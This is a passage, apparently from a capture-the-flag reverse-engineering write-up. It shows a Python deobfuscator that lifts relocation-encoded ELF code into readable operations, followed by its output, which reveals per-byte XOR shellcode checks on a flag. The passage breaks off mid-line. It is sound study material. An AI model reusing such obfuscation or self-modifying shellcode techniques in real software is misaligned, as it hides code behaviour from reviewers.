Sizes are now nops idx = 0 while idx &lt; len(instructions): match instructions[idx]: case Mov(SymAddr(Symbol(s), &#x27;st_size&#x27;), _, _, _) if s != 3: instructions[idx:idx+1] = [] idx += 1 return instructionsdef lift_indirect(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx:idx+3]: case [ Mov(RelocAddr(Reloc(rel_1), &#x27;r_addend&#x27;), Symbol(sidx_1), sz_1, ridx_1), Add(dst_2, sym_2, _, ridx_2), Mov(RelocAddr(Reloc(rel_3), &#x27;r_addend&#x27;), Ref(0), sz_3, _), ] if ( (rel_1 == ridx_2) and (rel_3 == ridx_2) ): instructions[idx:idx+3] = [ Add(dst_2, sym_2, Symbol(sidx_1), ridx_1) ] idx += 1 return instructionsBlock = namedtuple(&#x27;block&#x27;, [&#x27;arr&#x27;, &#x27;flag&#x27;, &#x27;ridx&#x27;])Output = namedtuple(&#x27;output&#x27;, [&#x27;out&#x27;, &#x27;arr&#x27;, &#x27;ridx&#x27;])def lift_block(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx:idx+18]: case [ Mov(_,arr,_,ridx), Add(_,_,_,_), Mov(_,flag,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), R32(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), Add(_,_,_,_), Add(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), ]: instructions[idx:idx+18] = [ Block(arr, flag, ridx) ] idx += 1 return instructionsReset = namedtuple(&#x27;reset&#x27;, [&#x27;ridx&#x27;])ShuffleBlock = namedtuple(&#x27;shuffleblock&#x27;, [&#x27;f1&#x27;, &#x27;f2&#x27;, &#x27;ridx&#x27;])def lift_reset(instructions): idx = 0 while idx &lt; len(instructions) - 256: good = True for i in range(256): op = instructions[idx+i] if type(op) == Mov: dst, src, _, _ = op if dst != ArrAddr(i) or src != Ref(i): good = False break else: good = False break if good: instructions[idx:idx+256] = [Reset(instructions[idx].ridx)] idx += 1 return instructionsdef lift_shuffle_block(instructions): idx = 0 while idx &lt; len(instructions) - 256: good = True for i in range(256): op = instructions[idx+i] if type(op) == Block: arr, flag, ridx = op if arr != Ref(ArrAddr(i)): good = False break else: good = False break if good: instructions[idx:idx+256] = [ShuffleBlock(instructions[idx].flag, instructions[idx+1].flag, instructions[idx].ridx)] idx += 1 return instructionsOutput = namedtuple(&#x27;output&#x27;, [&#x27;out&#x27;, &#x27;arr&#x27;, &#x27;ridx&#x27;])def lift_output(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx:idx+26]: case [ Mov(_,arr,_,ridx), Add(_,_,_,_), R32(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), Add(_,_,_,_), Add(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), R32(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), Add(_,_,_,_), Add(_,_,_,_), Mov(out,_,_,_), ]: instructions[idx:idx+26] = [Output(out, arr, ridx)] idx += 1 return instructionsMultAdd = namedtuple(&#x27;multadd&#x27;, [&#x27;out&#x27;, &#x27;val&#x27;, &#x27;k&#x27;, &#x27;ridx&#x27;])def lift_multadd(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx:idx+3]: # block prefix case [ Mov(Symbol(2), out, _, ridx), Mov(Symbol(5), Symbol(2), _, _), Mov(Symbol(6), Ref(0), _, _), ]: k = 0 double = False ptr = idx + 3 good = True while ptr &lt; len(instructions): match instructions[ptr]: case Mov(Symbol(2), Ref(Symbol(6)), _, _): double = True case Mov(Symbol(2), Ref(Symbol(5)), _, _): double = False case Add(Symbol(6), Symbol(6), Symbol(2), _): k = (k * 2) if double else (k + 1) case Add(Symbol(7), Symbol(7), Symbol(2), _): ptr += 1 break case _: good = False break ptr += 1 if good: instructions[idx:ptr] = [ MultAdd(Symbol(7), out, k, ridx) ] idx += 1 return instructionsTrunc = namedtuple(&#x27;trunc&#x27;, [&#x27;val&#x27;, &#x27;k&#x27;, &#x27;ridx&#x27;])def lift_truncate(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx:idx+2]: case [ Mov(Symbol(2), Ref(SymAddr(Symbol(5), 11)), _, ridx), Mov(SymAddr(Symbol(7), 11), Symbol(2), 5, _) ]: instructions[idx:idx+2] = [ Trunc(Symbol(7), 0xffffff, ridx)] idx += 1 return instructionsArraySlots = namedtuple(&#x27;arr&#x27;, [&#x27;values&#x27;, &#x27;ridx&#x27;])def lift_array_slots(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx]: case Mov(BaseAddr(), Ref(0), _, ridx): ptr = idx+1 while ptr &lt; len(instructions): op = instructions[ptr] if type(op) != Mov or op.dst != BaseAddr(): break ptr += 1 start = idx end = ptr data = [] # Check for movs into array. vstart = RelocAddr(Reloc(ridx), &#x27;r_address&#x27;).vaddr() offset = 0 while end + offset &lt; len(instructions) and offset &lt; ((end - start) * 3): op = instructions[end + offset] if type(op) == Mov and type(op.dst) is RelocAddr and op.dst.vaddr() == vstart + (offset * 8): data.append(op.src.val) else: break offset += 1 if len(data) &gt; 0: data += [0] * (((end - start) * 3) - len(data)) instructions[idx:end+offset] = [ ArraySlots(data, ridx) ] idx += 1 return instructionsShellcode = namedtuple(&#x27;shellcode&#x27;, [&#x27;dst&#x27;, &#x27;code&#x27;, &#x27;ridx&#x27;])def lift_shellcode(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx:idx+6]: case [ ArraySlots(values, ridx), Mov(Symbol(3), Ref(RelocAddr(Reloc(rel2), &#x27;r_address&#x27;)), _, _), Mov(SymAddr(Symbol(3), &#x27;st_name&#x27;), _, _, _), Add(dst, Symbol(3), _, _), Mov(Symbol(2), _, _, _), Mov(RelocAddr(Reloc(rel6), &#x27;r_address&#x27;), Symbol(2), _, _) ] if (rel2 == ridx) and (rel6 == ridx): instructions[idx:idx+6] = [ Shellcode(dst, b&#x27;&#x27;.join([(x &amp; 0xffffffffffffffff).to_bytes(8, &#x27;little&#x27;) for x in values]), ridx) ] idx += 1 return instructionsAop = namedtuple(&#x27;aop&#x27;, [&#x27;dst&#x27;, &#x27;op&#x27;, &#x27;val&#x27;, &#x27;k&#x27;, &#x27;ridx&#x27;])def lift_aop(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx:idx+5]: case [ Mov(Symbol(2), val, _, ridx), Mov(Symbol(5), Symbol(2), _, _), Shellcode(_, data, _), Mov(Symbol(2), Ref(Symbol(5)), _, _), Add(dst, dst2, Symbol(2), _) ] if len(data) == 24 and (dst == dst2): op = next(md.disasm(data, 0)) t = op.mnemonic k = int(op.op_str.split(&#x27;, &#x27;)[-1], 16) instructions[idx:idx+5] = [ Aop(dst, t, val, k, ridx) ] idx += 1 return instructionsdef dump(instructions): for op in instructions: match op: case Mov(SymAddr(sym, &#x27;st_name&#x27;), Ref(val), 8, ridx) if type(val) is int: name = val &amp; 0xffffffff info = (val &gt;&gt; 4) &amp; 0xff other = (val &gt;&gt; 5) &amp; 0xff shndx = (val &gt;&gt; 6) &amp; 0xffff print(f&#x27;[&#123;ridx:04d&#125;] :: setinfo &#123;sym&#125;, name=0x&#123;name:x&#125;, info=0x&#123;info:x&#125;, other=0x&#123;other:x&#125;, shndx=0x&#123;shndx:x&#125;&#x27;) case Mov(BaseAddr(), Ref(0), _, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: [ARRAY SLOT]&#x27;) case Mov(dst, src, 8, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: mov &#123;dst&#125;, &#123;src&#125;&#x27;) case Mov(dst, src, sz, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: mov(&#123;sz&#125;) &#123;dst&#125;, &#123;src&#125;&#x27;) case Add(dst, src, add, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: add &#123;dst&#125;, &#123;src&#125;, &#123;add&#125;&#x27;) case R32(dst, src, add, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: r32 &#123;dst&#125;, &#123;src&#125;, &#123;add&#125;&#x27;) case Block(arr, flag, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: shuffle &#123;arr&#125;, &#123;flag&#125;&#x27;) case Output(out, arr, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: output &#123;out&#125;, &#123;arr&#125;&#x27;) case ShuffleBlock(f1, f2, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: shuffleblock &#123;f1&#125;, &#123;f2&#125;&#x27;) case MultAdd(dst, val, k, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: madd &#123;dst&#125; += (&#123;val&#125; * &#123;k&#125;)&#x27;) case Aop(dst, op, val, k, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: aop &#123;dst&#125; += (&#123;val&#125; &#123;op&#125; &#123;k&#125;)&#x27;) case Reset(ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: reset&#x27;) case Trunc(val, k, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: trunc &#123;val&#125; &amp;= 0x&#123;k:x&#125;&#x27;) case ArraySlots(values, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: array [&#123;&quot;, &quot;.join([hex(x) for x in values])&#125;]&#x27;) case Shellcode(dst, code, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: exec &#123;dst&#125; &lt;- &#123;code.hex()&#125;&#x27;) print(&#x27;-&#x27; * 20) for i in md.disasm(code, 0): if i.mnemonic == &#x27;ret&#x27;: break print(&quot; 0x%x:\\t%s\\t%s&quot; %(i.address, i.mnemonic, i.op_str.replace(&#x27;0x8040e4&#x27;, &#x27;s5&#x27;).replace(&#x27;0x8040cc&#x27;, &#x27;s4&#x27;))) print(&#x27;-&#x27; * 20) case _: print(op)LIFTS = [ lift_mov_add, remove_sizes, lift_indirect, lift_block, lift_reset, lift_shuffle_block, lift_output, lift_multadd, lift_truncate, lift_array_slots, lift_shellcode, lift_aop,]def lift(instructions): for lift_fn in LIFTS: print(f&#x27;[*] &#123;lift_fn.__name__&#125;...&#x27;) instructions = lift_fn(instructions) return instructionsinstructions = parse(b)instructions = lift(instructions)dump(instructions) 得到： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757[0005] :: mov s2, &amp;flag[0][0007] :: mov(1) s4, s2[0008] :: [ARRAY SLOT][0009] :: mov arr[15], &amp;1585408084625667200[0010] :: mov arr[16], &amp;195[0011] :: mov s3, &amp;arr[15][0012] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0013] :: add arr[15], s3, 0[0014] :: mov s2, &amp;r101002.r_address[0016] :: mov(24) arr[15], s2[0017] :: [ARRAY SLOT][0018] :: mov arr[42], &amp;141015791240320[0019] :: mov arr[43], &amp;195[0020] :: mov s3, &amp;arr[42][0021] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0022] :: add arr[42], s3, 0[0023] :: mov arr[42], s2[0024] :: mov s2, &amp;s4[0026] :: mov(1) arr[0], s2[0027] :: mov s2, &amp;flag[1][0028] :: mov s4, s2[0029] :: [ARRAY SLOT][0030] :: mov arr[78], &amp;1657465678663595136[0031] :: mov arr[79], &amp;195[0032] :: mov s3, &amp;arr[78][0033] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0034] :: add arr[78], s3, 0[0035] :: mov s2, &amp;r101002.r_address[0037] :: mov(24) arr[78], s2[0038] :: [ARRAY SLOT][0039] :: mov arr[105], &amp;72198609829168256[0040] :: mov arr[106], &amp;195[0041] :: mov s3, &amp;arr[105][0042] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0043] :: add arr[105], s3, 0[0044] :: mov arr[105], s2[0045] :: mov s2, &amp;s4[0047] :: mov(1) arr[0], s2[0048] :: mov s2, &amp;flag[2][0049] :: mov s4, s2[0050] :: [ARRAY SLOT][0051] :: mov arr[141], &amp;1153062520398099584[0052] :: mov arr[142], &amp;195[0053] :: mov s3, &amp;arr[141][0054] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0055] :: add arr[141], s3, 0[0056] :: mov s2, &amp;r101002.r_address[0058] :: mov(24) arr[141], s2[0059] :: [ARRAY SLOT][0060] :: mov arr[168], &amp;144256203867096192[0061] :: mov arr[169], &amp;195[0062] :: mov s3, &amp;arr[168][0063] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0064] :: add arr[168], s3, 0[0065] :: mov arr[168], s2[0066] :: mov s2, &amp;s4[0068] :: mov(1) arr[0], s2[0069] :: mov s2, &amp;flag[3][0070] :: mov s4, s2[0071] :: [ARRAY SLOT][0072] :: mov arr[204], &amp;1297177708473955456[0073] :: mov arr[205], &amp;195[0074] :: mov s3, &amp;arr[204][0075] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0076] :: add arr[204], s3, 0[0077] :: mov s2, &amp;r101002.r_address[0079] :: mov(24) arr[204], s2[0080] :: [ARRAY SLOT][0081] :: mov arr[231], &amp;216313797905024128[0082] :: mov arr[232], &amp;195[0083] :: mov s3, &amp;arr[231][0084] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0085] :: add arr[231], s3, 0[0086] :: mov arr[231], s2[0087] :: mov s2, &amp;s4[0089] :: mov(1) arr[0], s2[0090] :: mov s2, &amp;flag[4][0091] :: mov s4, s2[0092] :: exec r92.r_address &lt;- 803425cc40800010c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x10--------------------[0101] :: array [0x4008040cc250480, 0xc3, 0x0][0104] :: mov s3, &amp;r101.r_address[0105] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0106] :: add r101.r_address, s3, 0[0107] :: mov r101.r_address, s2[0108] :: mov s2, &amp;s4[0110] :: mov(1) arr[0], s2[0111] :: mov s2, &amp;flag[5][0112] :: mov s4, s2[0113] :: exec r113.r_address &lt;- 803425cc40800011c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x11--------------------[0122] :: array [0x5008040cc250480, 0xc3, 0x0][0125] :: mov s3, &amp;r122.r_address[0126] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0127] :: add r122.r_address, s3, 0[0128] :: mov r122.r_address, s2[0129] :: mov s2, &amp;s4[0131] :: mov(1) arr[0], s2[0132] :: mov s2, &amp;flag[6][0133] :: mov s4, s2[0134] :: exec r134.r_address &lt;- 803425cc40800012c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x12--------------------[0143] :: array [0x6008040cc250480, 0xc3, 0x0][0146] :: mov s3, &amp;r143.r_address[0147] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0148] :: add r143.r_address, s3, 0[0149] :: mov r143.r_address, s2[0150] :: mov s2, &amp;s4[0152] :: mov(1) arr[0], s2[0153] :: mov s2, &amp;flag[7][0154] :: mov s4, s2[0155] :: exec r155.r_address &lt;- 803425cc40800013c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x13--------------------[0164] :: array [0x7008040cc250480, 0xc3, 0x0][0167] :: mov s3, &amp;r164.r_address[0168] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0169] :: add r164.r_address, s3, 0[0170] :: mov r164.r_address, s2[0171] :: mov s2, &amp;s4[0173] :: mov(1) arr[0], s2[0174] :: mov s2, &amp;flag[8][0175] :: mov s4, s2[0176] :: exec r176.r_address &lt;- 803425cc40800014c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x14--------------------[0185] :: array [0x8008040cc250480, 0xc3, 0x0][0188] :: mov s3, &amp;r185.r_address[0189] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0190] :: add r185.r_address, s3, 0[0191] :: mov r185.r_address, s2[0192] :: mov s2, &amp;s4[0194] :: mov(1) arr[1], s2[0195] :: mov s2, &amp;flag[9][0196] :: mov s4, s2[0197] :: exec r197.r_address &lt;- 803425cc40800015c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x15--------------------[0206] :: array [0x9008040cc250480, 0xc3, 0x0][0209] :: mov s3, &amp;r206.r_address[0210] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0211] :: add r206.r_address, s3, 0[0212] :: mov r206.r_address, s2[0213] :: mov s2, &amp;s4[0215] :: mov(1) arr[1], s2[0216] :: mov s2, &amp;flag[10][0217] :: mov s4, s2[0218] :: exec r218.r_address &lt;- 803425cc40800016c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x16--------------------[0227] :: array [0xa008040cc250480, 0xc3, 0x0][0230] :: mov s3, &amp;r227.r_address[0231] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0232] :: add r227.r_address, s3, 0[0233] :: mov r227.r_address, s2[0234] :: mov s2, &amp;s4[0236] :: mov(1) arr[1], s2[0237] :: mov s2, &amp;flag[11][0238] :: mov s4, s2[0239] :: exec r239.r_address &lt;- 803425cc40800017c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x17--------------------[0248] :: array [0xb008040cc250480, 0xc3, 0x0][0251] :: mov s3, &amp;r248.r_address[0252] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0253] :: add r248.r_address, s3, 0[0254] :: mov r248.r_address, s2[0255] :: mov s2, &amp;s4[0257] :: mov(1) arr[1], s2[0258] :: mov s2, &amp;flag[12][0259] :: mov s4, s2[0260] :: exec r260.r_address &lt;- 803425cc40800018c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x18--------------------[0269] :: array [0xc008040cc250480, 0xc3, 0x0][0272] :: mov s3, &amp;r269.r_address[0273] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0274] :: add r269.r_address, s3, 0[0275] :: mov r269.r_address, s2[0276] :: mov s2, &amp;s4[0278] :: mov(1) arr[1], s2[0279] :: mov s2, &amp;flag[13][0280] :: mov s4, s2[0281] :: exec r281.r_address &lt;- 803425cc40800019c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x19--------------------[0290] :: array [0xd008040cc250480, 0xc3, 0x0][0293] :: mov s3, &amp;r290.r_address[0294] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0295] :: add r290.r_address, s3, 0[0296] :: mov r290.r_address, s2[0297] :: mov s2, &amp;s4[0299] :: mov(1) arr[1], s2[0300] :: mov s2, &amp;flag[14][0301] :: mov s4, s2[0302] :: exec r302.r_address &lt;- 803425cc40800024c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x24--------------------[0311] :: array [0xe008040cc250480, 0xc3, 0x0][0314] :: mov s3, &amp;r311.r_address[0315] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0316] :: add r311.r_address, s3, 0[0317] :: mov r311.r_address, s2[0318] :: mov s2, &amp;s4[0320] :: mov(1) arr[1], s2[0321] :: mov s2, &amp;flag[15][0322] :: mov s4, s2[0323] :: exec r323.r_address &lt;- 803425cc4080002cc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x2c--------------------[0332] :: array [0xf008040cc250480, 0xc3, 0x0][0335] :: mov s3, &amp;r332.r_address[0336] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0337] :: add r332.r_address, s3, 0[0338] :: mov r332.r_address, s2[0339] :: mov s2, &amp;s4[0341] :: mov(1) arr[1], s2[0342] :: mov s2, &amp;flag[16][0343] :: mov s4, s2[0344] :: exec r344.r_address &lt;- 803425cc40800026c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x26--------------------[0353] :: array [0x10008040cc250480, 0xc3, 0x0][0356] :: mov s3, &amp;r353.r_address[0357] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0358] :: add r353.r_address, s3, 0[0359] :: mov r353.r_address, s2[0360] :: mov s2, &amp;s4[0362] :: mov(1) arr[2], s2[0363] :: mov s2, &amp;flag[17][0364] :: mov s4, s2[0365] :: exec r365.r_address &lt;- 803425cc4080001ec3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x1e--------------------[0374] :: array [0x11008040cc250480, 0xc3, 0x0][0377] :: mov s3, &amp;r374.r_address[0378] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0379] :: add r374.r_address, s3, 0[0380] :: mov r374.r_address, s2[0381] :: mov s2, &amp;s4[0383] :: mov(1) arr[2], s2[0384] :: mov s2, &amp;flag[18][0385] :: mov s4, s2[0386] :: exec r386.r_address &lt;- 803425cc4080001fc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x1f--------------------[0395] :: array [0x12008040cc250480, 0xc3, 0x0][0398] :: mov s3, &amp;r395.r_address[0399] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0400] :: add r395.r_address, s3, 0[0401] :: mov r395.r_address, s2[0402] :: mov s2, &amp;s4[0404] :: mov(1) arr[2], s2[0405] :: mov s2, &amp;flag[19][0406] :: mov s4, s2[0407] :: exec r407.r_address &lt;- 803425cc40800020c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x20--------------------[0416] :: array [0x13008040cc250480, 0xc3, 0x0][0419] :: mov s3, &amp;r416.r_address[0420] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0421] :: add r416.r_address, s3, 0[0422] :: mov r416.r_address, s2[0423] :: mov s2, &amp;s4[0425] :: mov(1) arr[2], s2[0426] :: mov s2, &amp;flag[20][0427] :: mov s4, s2[0428] :: exec r428.r_address &lt;- 803425cc40800020c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x20--------------------[0437] :: array [0x14008040cc250480, 0xc3, 0x0][0440] :: mov s3, &amp;r437.r_address[0441] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0442] :: add r437.r_address, s3, 0[0443] :: mov r437.r_address, s2[0444] :: mov s2, &amp;s4[0446] :: mov(1) arr[2], s2[0447] :: mov s2, &amp;flag[21][0448] :: mov s4, s2[0449] :: exec r449.r_address &lt;- 803425cc40800021c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x21--------------------[0458] :: array [0x15008040cc250480, 0xc3, 0x0][0461] :: mov s3, &amp;r458.r_address[0462] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0463] :: add r458.r_address, s3, 0[0464] :: mov r458.r_address, s2[0465] :: mov s2, &amp;s4[0467] :: mov(1) arr[2], s2[0468] :: mov s2, &amp;flag[22][0469] :: mov s4, s2[0470] :: exec r470.r_address &lt;- 803425cc40800023c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x23--------------------[0479] :: array [0x16008040cc250480, 0xc3, 0x0][0482] :: mov s3, &amp;r479.r_address[0483] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0484] :: add r479.r_address, s3, 0[0485] :: mov r479.r_address, s2[0486] :: mov s2, &amp;s4[0488] :: mov(1) arr[2], s2[0489] :: mov s2, &amp;flag[23][0490] :: mov s4, s2[0491] :: exec r491.r_address &lt;- 803425cc40800027c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x27--------------------[0500] :: array [0x17008040cc250480, 0xc3, 0x0][0503] :: mov s3, &amp;r500.r_address[0504] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0505] :: add r500.r_address, s3, 0[0506] :: mov r500.r_address, s2[0507] :: mov s2, &amp;s4[0509] :: mov(1) arr[2], s2[0510] :: mov s2, &amp;flag[24][0511] :: mov s4, s2[0512] :: exec r512.r_address &lt;- 803425cc40800024c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x24--------------------[0521] :: array [0x18008040cc250480, 0xc3, 0x0][0524] :: mov s3, &amp;r521.r_address[0525] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0526] :: add r521.r_address, s3, 0[0527] :: mov r521.r_address, s2[0528] :: mov s2, &amp;s4[0530] :: mov(1) arr[3], s2[0531] :: mov s2, &amp;flag[25][0532] :: mov s4, s2[0533] :: exec r533.r_address &lt;- 803425cc40800025c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x25--------------------[0542] :: array [0x19008040cc250480, 0xc3, 0x0][0545] :: mov s3, &amp;r542.r_address[0546] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0547] :: add r542.r_address, s3, 0[0548] :: mov r542.r_address, s2[0549] :: mov s2, &amp;s4[0551] :: mov(1) arr[3], s2[0552] :: mov s2, &amp;flag[26][0553] :: mov s4, s2[0554] :: exec r554.r_address &lt;- 803425cc40800026c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x26--------------------[0563] :: array [0x1a008040cc250480, 0xc3, 0x0][0566] :: mov s3, &amp;r563.r_address[0567] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0568] :: add r563.r_address, s3, 0[0569] :: mov r563.r_address, s2[0570] :: mov s2, &amp;s4[0572] :: mov(1) arr[3], s2[0573] :: mov s2, &amp;flag[27][0574] :: mov s4, s2[0575] :: exec r575.r_address &lt;- 803425cc40800027c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x27--------------------[0584] :: array [0x1b008040cc250480, 0xc3, 0x0][0587] :: mov s3, &amp;r584.r_address[0588] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0589] :: add r584.r_address, s3, 0[0590] :: mov r584.r_address, s2[0591] :: mov s2, &amp;s4[0593] :: mov(1) arr[3], s2[0594] :: mov s4, &amp;0[0595] :: mov fail(), &amp;0[0596] :: mov s5, &amp;0[0597] :: mov s2, &amp;arr[0][0599] :: mov s6, s2[0600] :: exec r600.r_address &lt;- 803425fc40800070c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x70--------------------[0609] :: mov s2, &amp;s6[0611] :: add s5, s5, s2[0614] :: mov s6, &amp;0[0615] :: mov s2, &amp;arr[0][0616] :: mov s6, s2[0617] :: exec r617.r_address &lt;- 803425fc4080007cc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x7c--------------------[0626] :: mov s2, &amp;s6[0628] :: add s5, s5, s2[0631] :: mov s6, &amp;0[0632] :: mov s2, &amp;arr[0][0633] :: mov s6, s2[0634] :: exec r634.r_address &lt;- 803425fc40800073c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x73--------------------[0643] :: mov s2, &amp;s6[0645] :: add s5, s5, s2[0648] :: mov s6, &amp;0[0649] :: mov s2, &amp;arr[0][0650] :: mov s6, s2[0651] :: exec r651.r_address &lt;- 803425fc40800078c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x78--------------------[0660] :: mov s2, &amp;s6[0662] :: add s5, s5, s2[0665] :: mov s6, &amp;0[0666] :: mov s2, &amp;arr[0][0667] :: mov s6, s2[0668] :: exec r668.r_address &lt;- 803425fc4080006fc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x6f--------------------[0677] :: mov s2, &amp;s6[0679] :: add s5, s5, s2[0682] :: mov s6, &amp;0[0683] :: mov s2, &amp;arr[0][0684] :: mov s6, s2[0685] :: exec r685.r_address &lt;- 803425fc40800027c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x27--------------------[0694] :: mov s2, &amp;s6[0696] :: add s5, s5, s2[0699] :: mov s6, &amp;0[0700] :: mov s2, &amp;arr[0][0701] :: mov s6, s2[0702] :: exec r702.r_address &lt;- 803425fc4080002ac3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x2a--------------------[0711] :: mov s2, &amp;s6[0713] :: add s5, s5, s2[0716] :: mov s6, &amp;0[0717] :: mov s2, &amp;arr[0][0718] :: mov s6, s2[0719] :: exec r719.r_address &lt;- 803425fc4080002cc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 